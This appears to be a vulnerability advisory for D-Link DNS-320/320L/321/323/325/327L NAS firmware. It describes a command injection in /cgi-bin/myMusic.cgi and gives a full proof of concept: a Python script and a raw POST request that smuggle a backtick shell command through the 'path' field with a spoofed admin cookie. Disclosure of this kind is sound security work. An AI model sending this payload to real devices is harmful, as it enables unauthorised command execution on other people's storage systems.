# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)

# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_write_playlist function of the file /cgi-bin/myMusic.cgi.  The variable `path`is passed from a POST request and is assigned to `v1` via the `snprintf` function at line 13 and invoked by the `system` command,  it can lead to command execution.

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723711977162-131f8499-e59e-4713-9f80-d270ea0019c8.png#averageHue=%23fdfdf8&clientId=u925acd4f-7201-4&from=paste&height=220&id=u722c0a7a&originHeight=220&originWidth=1069&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37413&status=done&style=none&taskId=uaaf203bd-5b25-4093-b471-1f880cede51&title=&width=1069)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/myMusic.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_write_playlist&path=`touch%09/tmp/114`&idx=1"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/myMusic.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_write_playlist&path=`touch%09/tmp/114`&idx=1
```
